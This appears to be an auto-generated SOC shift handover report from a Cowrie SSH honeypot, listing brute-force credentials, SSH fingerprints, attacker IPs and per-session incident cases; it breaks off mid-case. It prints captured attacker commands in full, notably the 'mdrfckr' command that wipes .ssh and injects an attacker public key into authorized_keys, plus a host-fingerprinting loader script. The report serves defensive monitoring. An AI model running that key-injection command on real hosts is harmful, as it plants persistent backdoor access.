# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-26 |
| **Generated At** | 2026-07-26T17:07:35Z |
| **Shift Time** | 17:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **142** |
| Confirmed Threats | **128** |
| False Positives Filtered | **14** (9.9%) |
| Unique Attacker IPs | **76** |
| Countries of Origin | **27** |
| High Severity Cases | **58** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **84** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **74** |
| Unique Credential Pairs | **37** |
| Unique Usernames | **15** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **66** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `test` | 11 |
| `user` | 8 |
| `support` | 8 |
| `config` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `test555` | 5 |
| `111111` | 5 |
| `3245gs5662d34` | 4 |
| `99999` | 4 |
| `smo@@kkklss` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `test` | `test555` | 5 |
| `user` | `99999` | 4 |
| `root` | `smo@@kkklss` | 4 |
| `config` | `2222222` | 4 |
| `default` | `7` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `pongsiri` | `pongsiri` | `68.183.236.1` | 2026-07-26T14:59:32 |
| `345gs5662d34` | `345gs5662d34` | `68.183.236.1` | 2026-07-26T14:59:36 |
| `pongsiri` | `3245gs5662d34` | `68.183.236.1` | 2026-07-26T14:59:38 |
| `root` | `﻿------fuck------` | `36.212.229.164` | 2026-07-26T15:07:45 |
| `git` | `1111` | `161.35.179.218` | 2026-07-26T15:11:06 |
| `345gs5662d34` | `345gs5662d34` | `161.35.179.218` | 2026-07-26T15:11:07 |
| `git` | `3245gs5662d34` | `161.35.179.218` | 2026-07-26T15:11:08 |
| `user` | `99999` | `117.158.166.73` | 2026-07-26T15:11:40 |
| `nobody` | `3` | `211.104.166.110` | 2026-07-26T15:14:24 |
| `nobody` | `3` | `65.20.251.41` | 2026-07-26T15:14:32 |
| `user` | `99999` | `60.172.54.36` | 2026-07-26T15:14:59 |
| `user` | `99999` | `65.20.202.4` | 2026-07-26T15:15:06 |
| `user` | `99999` | `10.0.0.73` | 2026-07-26T15:15:19 |
| `root` | `ubuntu` | `123.126.40.7` | 2026-07-26T15:17:55 |
| `test` | `0000` | `70.89.116.5` | 2026-07-26T15:22:35 |
| `test` | `0000` | `10.0.0.73` | 2026-07-26T15:23:03 |
| `sarah` | `sarah` | `14.103.105.246` | 2026-07-26T15:25:35 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-26T15:31:36 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-26T15:31:36 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-26T15:31:40 |
| `michael` | `michael` | `112.197.2.116` | 2026-07-26T15:32:44 |
| `test` | `test555` | `200.232.114.71` | 2026-07-26T15:36:16 |
| `test` | `test555` | `59.34.17.130` | 2026-07-26T15:36:30 |
| `config` | `2222222` | `76.133.97.153` | 2026-07-26T15:39:00 |
| `test` | `test555` | `103.93.37.178` | 2026-07-26T15:39:47 |
| `test` | `test555` | `10.0.0.73` | 2026-07-26T15:40:13 |
| `bee` | `bee` | `14.103.105.246` | 2026-07-26T15:41:09 |
| `config` | `2222222` | `36.64.33.82` | 2026-07-26T15:42:34 |
| `config` | `2222222` | `181.212.174.164` | 2026-07-26T15:42:46 |
| `config` | `2222222` | `10.0.0.73` | 2026-07-26T15:42:46 |
| `test` | `999999` | `179.181.133.153` | 2026-07-26T15:44:09 |
| `root` | `!root` | `80.94.92.55` | 2026-07-26T15:45:36 |
| `test` | `999999` | `10.0.0.73` | 2026-07-26T15:47:41 |
| `root` | `asdf.1234` | `14.103.105.246` | 2026-07-26T15:48:24 |
| `root` | `3245gs5662d34` | `14.103.105.246` | 2026-07-26T15:48:36 |
| `root` | `111111` | `80.94.92.55` | 2026-07-26T15:51:08 |
| `root` | `123123` | `80.94.92.55` | 2026-07-26T15:58:26 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-26T16:00:18 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-26T16:00:19 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-26T16:00:19 |
| `default` | `7` | `112.31.93.229` | 2026-07-26T16:01:11 |
| `default` | `7` | `200.105.141.172` | 2026-07-26T16:01:26 |
| `user` | `111111` | `93.4.16.74` | 2026-07-26T16:03:38 |
| `user` | `111111` | `106.245.246.26` | 2026-07-26T16:03:46 |
| `root` | `1234` | `80.94.92.55` | 2026-07-26T16:03:59 |
| `default` | `7` | `10.0.0.73` | 2026-07-26T16:04:47 |
| `user` | `111111` | `60.173.105.206` | 2026-07-26T16:07:03 |
| `user` | `111111` | `60.166.8.174` | 2026-07-26T16:07:22 |
| `centos` | `9999` | `196.188.93.169` | 2026-07-26T16:08:31 |
| `centos` | `9999` | `49.206.194.29` | 2026-07-26T16:08:40 |
| `root` | `12345` | `80.94.92.55` | 2026-07-26T16:09:50 |
| `centos` | `9999` | `65.20.187.47` | 2026-07-26T16:12:05 |
| `root` | `12345678` | `80.94.92.55` | 2026-07-26T16:21:21 |
| `blank` | `777` | `10.0.0.73` | 2026-07-26T16:29:25 |
| `blank` | `5555` | `201.28.237.90` | 2026-07-26T16:31:31 |
| `support` | `333333` | `34.41.211.48` | 2026-07-26T16:33:12 |
| `support` | `333333` | `103.171.39.147` | 2026-07-26T16:33:20 |
| `support` | `333333` | `10.0.0.73` | 2026-07-26T16:36:58 |
| `support` | `support` | `176.53.159.196` | 2026-07-26T16:42:49 |
| `support` | `support` | `10.0.0.73` | 2026-07-26T16:44:10 |
| `root` | `1q2w3e4r!@#$` | `89.167.17.184` | 2026-07-26T16:44:35 |
| `345gs5662d34` | `345gs5662d34` | `89.167.17.184` | 2026-07-26T16:44:38 |
| `root` | `3245gs5662d34` | `89.167.17.184` | 2026-07-26T16:44:39 |
| `support` | `22` | `24.142.170.231` | 2026-07-26T16:50:11 |
| `support` | `22` | `58.22.255.28` | 2026-07-26T16:50:20 |
| `support` | `22` | `10.0.0.73` | 2026-07-26T16:53:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **142** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 37 |
| OpenSSH | 27 |
| Go SSH scanner | 14 |
| Paramiko (Python) | 8 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 27 | 27 |
| `f555226df196...` | Mirai/variant | 10 | 4 |
| `af8223ac9914...` | libssh-based | 10 | 1 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 27 | 27 | Mirai/variant |
| `95420f9d932d...` | libssh | 17 | 7 | — |
| `f555226df196...` | libssh | 10 | 4 | Mirai/variant |
| `af8223ac9914...` | libssh | 10 | 1 | libssh-based |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 7 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 6 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.55`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `161.35.179.218`, `89.167.17.184`, `14.103.105.246`, `68.183.236.1`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **76** |
| Unique ASNs | **54** |
| High-Risk ASNs | **48** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS35042` | Layer7 Networks GmbH | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (58)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b3c459c61f0d

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-07-26 14:59 |
| **Last Seen** | 2026-07-26 14:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:59:30` | `cowrie.session.connect` |
| `2026-07-26 14:59:30` | `cowrie.client.version` |
| `2026-07-26 14:59:31` | `cowrie.client.kex` |
| `2026-07-26 14:59:32` | `cowrie.login.success` |
| `2026-07-26 14:59:33` | `cowrie.session.params` |
| `2026-07-26 14:59:33` | `cowrie.command.input` |
| `2026-07-26 14:59:33` | `cowrie.command.failed` |
| `2026-07-26 14:59:33` | `cowrie.log.closed` |
| `2026-07-26 14:59:34` | `cowrie.session.params` |
| `2026-07-26 14:59:34` | `cowrie.command.input` |
| `2026-07-26 14:59:34` | `cowrie.session.file_download` |
| `2026-07-26 14:59:34` | `cowrie.log.closed` |
| `2026-07-26 14:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e971264a072

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-07-26 14:59 |
| **Last Seen** | 2026-07-26 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:59:35` | `cowrie.session.connect` |
| `2026-07-26 14:59:35` | `cowrie.client.version` |
| `2026-07-26 14:59:35` | `cowrie.client.kex` |
| `2026-07-26 14:59:36` | `cowrie.login.success` |
| `2026-07-26 14:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcde6d4183d6

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-07-26 14:59 |
| **Last Seen** | 2026-07-26 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:59:36` | `cowrie.session.connect` |
| `2026-07-26 14:59:36` | `cowrie.client.version` |
| `2026-07-26 14:59:37` | `cowrie.client.kex` |
| `2026-07-26 14:59:38` | `cowrie.login.success` |
| `2026-07-26 14:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56e82bea630a

| Field | Detail |
|---|---|
| **Source IP** | `36.212.229[.]164` |
| **First Seen** | 2026-07-26 15:07 |
| **Last Seen** | 2026-07-26 15:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:07:44` | `cowrie.session.connect` |
| `2026-07-26 15:07:44` | `cowrie.client.version` |
| `2026-07-26 15:07:44` | `cowrie.client.kex` |
| `2026-07-26 15:07:45` | `cowrie.login.success` |
| `2026-07-26 15:07:46` | `cowrie.session.params` |
| `2026-07-26 15:07:46` | `cowrie.command.input` |
| `2026-07-26 15:07:46` | `cowrie.log.closed` |
| `2026-07-26 15:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.212.229[.]164` to AbuseIPDB if not already reported
- [ ] Block `36.212.229[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783199dc6fa9

| Field | Detail |
|---|---|
| **Source IP** | `161.35.179[.]218` |
| **First Seen** | 2026-07-26 15:11 |
| **Last Seen** | 2026-07-26 15:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:11:05` | `cowrie.session.connect` |
| `2026-07-26 15:11:05` | `cowrie.client.version` |
| `2026-07-26 15:11:05` | `cowrie.client.kex` |
| `2026-07-26 15:11:06` | `cowrie.login.success` |
| `2026-07-26 15:11:07` | `cowrie.session.params` |
| `2026-07-26 15:11:07` | `cowrie.command.input` |
| `2026-07-26 15:11:07` | `cowrie.command.failed` |
| `2026-07-26 15:11:07` | `cowrie.log.closed` |
| `2026-07-26 15:11:07` | `cowrie.session.params` |
| `2026-07-26 15:11:07` | `cowrie.command.input` |
| `2026-07-26 15:11:07` | `cowrie.session.file_download` |
| `2026-07-26 15:11:07` | `cowrie.log.closed` |
| `2026-07-26 15:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.179[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.35.179[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a44b6216d98e

| Field | Detail |
|---|---|
| **Source IP** | `161.35.179[.]218` |
| **First Seen** | 2026-07-26 15:11 |
| **Last Seen** | 2026-07-26 15:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:11:07` | `cowrie.session.connect` |
| `2026-07-26 15:11:07` | `cowrie.client.version` |
| `2026-07-26 15:11:07` | `cowrie.client.kex` |
| `2026-07-26 15:11:07` | `cowrie.login.success` |
| `2026-07-26 15:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.179[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.35.179[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b23e18f6c5

| Field | Detail |
|---|---|
| **Source IP** | `161.35.179[.]218` |
| **First Seen** | 2026-07-26 15:11 |
| **Last Seen** | 2026-07-26 15:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:11:07` | `cowrie.session.connect` |
| `2026-07-26 15:11:07` | `cowrie.client.version` |
| `2026-07-26 15:11:07` | `cowrie.client.kex` |
| `2026-07-26 15:11:08` | `cowrie.login.success` |
| `2026-07-26 15:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.179[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.35.179[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf911c7e61d8

| Field | Detail |
|---|---|
| **Source IP** | `117.158.166[.]73` |
| **First Seen** | 2026-07-26 15:11 |
| **Last Seen** | 2026-07-26 15:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:11:36` | `cowrie.session.connect` |
| `2026-07-26 15:11:37` | `cowrie.client.version` |
| `2026-07-26 15:11:37` | `cowrie.client.kex` |
| `2026-07-26 15:11:40` | `cowrie.login.success` |
| `2026-07-26 15:11:40` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.166[.]73` to AbuseIPDB if not already reported
- [ ] Block `117.158.166[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ba715ea43ba

| Field | Detail |
|---|---|
| **Source IP** | `211.104.166[.]110` |
| **First Seen** | 2026-07-26 15:14 |
| **Last Seen** | 2026-07-26 15:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:14:21` | `cowrie.session.connect` |
| `2026-07-26 15:14:21` | `cowrie.client.version` |
| `2026-07-26 15:14:21` | `cowrie.client.kex` |
| `2026-07-26 15:14:24` | `cowrie.login.success` |
| `2026-07-26 15:14:25` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.104.166[.]110` to AbuseIPDB if not already reported
- [ ] Block `211.104.166[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d215c23f0044

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-07-26 15:14 |
| **Last Seen** | 2026-07-26 15:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:14:30` | `cowrie.session.connect` |
| `2026-07-26 15:14:30` | `cowrie.client.version` |
| `2026-07-26 15:14:30` | `cowrie.client.kex` |
| `2026-07-26 15:14:32` | `cowrie.login.success` |
| `2026-07-26 15:14:32` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08181ff9ca7a

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-07-26 15:14 |
| **Last Seen** | 2026-07-26 15:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:14:53` | `cowrie.session.connect` |
| `2026-07-26 15:14:54` | `cowrie.client.version` |
| `2026-07-26 15:14:54` | `cowrie.client.kex` |
| `2026-07-26 15:14:59` | `cowrie.login.success` |
| `2026-07-26 15:14:59` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cfd7b936baf

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-07-26 15:15 |
| **Last Seen** | 2026-07-26 15:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:15:04` | `cowrie.session.connect` |
| `2026-07-26 15:15:05` | `cowrie.client.version` |
| `2026-07-26 15:15:05` | `cowrie.client.kex` |
| `2026-07-26 15:15:06` | `cowrie.login.success` |
| `2026-07-26 15:15:06` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aec4f57032d5

| Field | Detail |
|---|---|
| **Source IP** | `123.126.40[.]7` |
| **First Seen** | 2026-07-26 15:17 |
| **Last Seen** | 2026-07-26 15:22 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:17:54` | `cowrie.session.connect` |
| `2026-07-26 15:17:54` | `cowrie.client.version` |
| `2026-07-26 15:17:54` | `cowrie.client.kex` |
| `2026-07-26 15:17:55` | `cowrie.login.success` |
| `2026-07-26 15:22:55` | `cowrie.session.file_upload` |
| `2026-07-26 15:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.126.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `123.126.40[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c61963c0c70

| Field | Detail |
|---|---|
| **Source IP** | `70.89.116[.]5` |
| **First Seen** | 2026-07-26 15:22 |
| **Last Seen** | 2026-07-26 15:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:22:33` | `cowrie.session.connect` |
| `2026-07-26 15:22:34` | `cowrie.client.version` |
| `2026-07-26 15:22:34` | `cowrie.client.kex` |
| `2026-07-26 15:22:35` | `cowrie.login.success` |
| `2026-07-26 15:22:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.89.116[.]5` to AbuseIPDB if not already reported
- [ ] Block `70.89.116[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5ff117f4870

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]246` |
| **First Seen** | 2026-07-26 15:25 |
| **Last Seen** | 2026-07-26 15:30 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
